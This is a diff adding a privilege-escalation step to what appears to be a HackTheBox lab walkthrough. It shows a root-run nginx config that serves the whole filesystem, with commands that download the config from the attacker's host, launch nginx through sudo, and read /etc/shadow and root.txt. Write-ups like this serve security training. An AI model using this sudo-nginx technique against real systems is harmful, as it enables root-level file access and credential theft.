@@ -43,3 +43,29 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 sudo -l
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/b859f21c-8787-40ff-af31-430a25fb5886)
+
+```
+user root;
+events {
+    worker_connections 1024;
+}
+http {
+    server {
+        listen 1337;
+        root /;
+        autoindex on;
+    }
+}
+```
+```
+python3 -m http.server 80
+wget 10.10.14.12/privesc.conf
+sudo /usr/sbin/nginx -c /tmp/privesc.conf
+curl localhost:1337/etc/shadow
+curl localhost:1337/root/root.txt
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/60e2f555-7bbc-42b3-8032-d98337503493)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/a524f463-885a-4995-aec9-cf33583e22d3)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/9c6fe913-03a7-4805-832b-e032bd0cb45d)
